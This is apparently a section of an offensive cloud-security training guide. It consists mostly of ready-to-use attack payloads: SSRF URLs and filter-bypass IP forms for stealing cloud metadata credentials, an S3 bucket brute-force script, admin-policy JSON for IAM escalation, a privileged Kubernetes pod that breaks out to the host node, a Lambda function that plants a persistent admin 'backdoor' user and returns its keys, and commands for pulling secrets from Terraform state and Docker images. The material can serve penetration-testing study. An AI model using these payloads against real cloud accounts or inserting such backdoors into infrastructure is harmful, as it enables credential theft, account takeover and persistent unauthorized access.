# 06 — Cloud Security: Payloads

> Ready-to-use payloads for cloud exploitation scenarios.

> 📋 **What You Will Do In This Section**
> - [ ] Use SSRF payloads to steal EC2 metadata credentials
> - [ ] Brute-force S3 bucket names using common patterns
> - [ ] Extract secrets from Terraform state files
> - [ ] Pull and analyze Docker images for embedded secrets
> - [ ] Deploy privileged K8s pods and Lambda backdoors

---

## 🔴 SSRF → AWS Credential Theft

> 💡 **Why This Matters**
> If you find an SSRF in any web application running on EC2, these URLs steal the instance's IAM credentials. This is the most impactful cloud attack — a simple SSRF can escalate to full AWS account compromise.

```
# IMDSv1 — Direct GET requests
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/

# Alternative IP formats (bypass WAF/filters)
http://0xA9FEA9FE/latest/meta-data/
http://2852039166/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
```

#### 🧪 Try It Now — SSRF Payload Quick Reference

```bash
echo "=== Cloud SSRF Payloads ==="
echo ""
echo "AWS (IMDSv1):"
echo "  http://169.254.169.254/latest/meta-data/iam/security-credentials/"
echo ""
echo "AWS (Bypass filters):"
echo "  http://0xA9FEA9FE/latest/meta-data/"
echo "  http://2852039166/latest/meta-data/"
echo ""
echo "GCP:"
echo "  http://metadata.google.internal/computeMetadata/v1/"
echo "  Header: Metadata-Flavor: Google"
echo ""
echo "Azure:"
echo "  http://169.254.169.254/metadata/instance?api-version=2021-02-01"
echo "  Header: Metadata: true"
```

---

## 🔴 S3 Bucket Brute Force Patterns

> 💡 **Why This Matters**
> Companies use predictable naming patterns for S3 buckets. Testing these patterns with `--no-sign-request` is a quick way to discover public data exposure in any bug bounty program.

```
{company}-backup
{company}-dev
{company}-staging
{company}-prod
{company}-logs
{company}-data
{company}-internal
{company}-assets
{company}-uploads
{company}-config
{company}-db-backup
{company}-terraform
{company}.{tld}
www.{company}.{tld}
api.{company}.{tld}
```

#### 🧪 Try It Now — S3 Bucket Scanner

```bash
echo "=== S3 Bucket Scanner ==="
echo "Replace COMPANY with your target:"
echo ""
echo '#!/bin/bash'
echo 'COMPANY=$1'
echo 'for suffix in backup dev staging prod logs data internal assets uploads config db-backup terraform; do'
echo '  BUCKET="${COMPANY}-${suffix}"'
echo '  if aws s3 ls s3://$BUCKET --no-sign-request 2>/dev/null; then'
echo '    echo "[+] PUBLIC: $BUCKET"'
echo '  fi'
echo 'done'
echo ""
echo "Usage: ./s3scan.sh targetcompany"
```

---

## 🔴 AWS IAM Privilege Escalation Payloads

```json
// Admin policy document — attach to your user for full access
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}

// S3 read-all policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:*",
    "Resource": "*"
  }]
}
```

---

## 🔴 Kubernetes Privileged Pod YAML

> 💡 **Why This Matters**
> If you have permission to create pods, this YAML gives you root access on the underlying node. It mounts the host filesystem and uses hostPID/hostNetwork to break out of the container.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privesc
    image: ubuntu
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

---

## 🔴 Lambda Backdoor (Python)

> 💡 **Why This Matters**
> If you have Lambda create permissions + iam:PassRole, you can create a function that runs with an admin role. This function creates a backdoor IAM user with full admin access — persistent even after the Lambda is deleted.

```python
import boto3
import json

def handler(event, context):
    # Create backdoor user
    iam = boto3.client('iam')
    iam.create_user(UserName='backdoor')
    iam.attach_user_policy(
        UserName='backdoor',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    keys = iam.create_access_key(UserName='backdoor')
    
    return {
        'statusCode': 200,
        'body': json.dumps(keys['AccessKey'])
    }
```

---

## 🔴 Terraform State Theft

```bash
# If Terraform state file is in an accessible S3 bucket
aws s3 cp s3://bucket/terraform.tfstate ./

# Contains ALL infrastructure details including passwords, keys, connection strings
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.secret != null)'
```

---

## 🔴 Docker Image Secret Extraction

```bash
# Pull and extract secrets from Docker images
docker save target-image:tag -o image.tar
tar xf image.tar
for layer in */layer.tar; do
  tar xf "$layer" 2>/dev/null
  grep -rn "password\|secret\|key\|token\|API_KEY\|AWS_" . 2>/dev/null
done
```

---

## 📋 Cloud Payload Selection

| Scenario | Payload | Impact |
|----------|---------|--------|
| SSRF on EC2 | Metadata URL | IAM credential theft |
| Public S3 bucket | `--no-sign-request` | Data exfiltration |
| IAM with iam:CreatePolicy | Admin policy JSON | Account takeover |
| K8s with create pods | Privileged pod YAML | Node compromise |
| Lambda + PassRole | Backdoor function | Persistent access |
| Terraform state exposed | jq password extraction | Credential theft |

---

## 🧠 If You're Stuck

1. **SSRF blocked by IMDSv2**: Need PUT request for token first — standard GET SSRF won't work. Try GCP/Azure metadata instead.
2. **S3 bucket exists but access denied**: It's not public. Try authenticated access if you have any AWS credentials.
3. **K8s pod creation denied**: Check with `kubectl auth can-i create pods` — you might not have this permission.
4. **Docker image extraction messy**: Use `docker inspect target:tag` first to find interesting layers.
